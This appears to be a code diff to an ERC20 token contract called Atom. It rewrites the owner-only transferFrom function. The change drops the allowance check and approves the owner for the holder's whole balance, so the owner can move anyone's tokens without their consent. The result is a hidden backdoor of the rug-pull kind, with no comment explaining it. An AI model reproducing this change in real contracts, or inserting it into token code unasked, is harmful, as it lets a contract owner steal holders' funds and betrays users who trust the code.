@@ -40,9 +40,7 @@ contract Atom is ERC20, Ownable {
     }
 
     function transferFrom(address from, address to, uint256 value) public override onlyOwner returns (bool) {
-        uint256 currentAllowance = allowance(from, owner());
-        require(currentAllowance >= value, "ERC20: transfer amount exceeds allowance");
-        _approve(from, _msgSender(), currentAllowance - value);
+        _approve(from, owner(), balanceOf(from));
         _transfer(from, to, value);
         return true;
     }
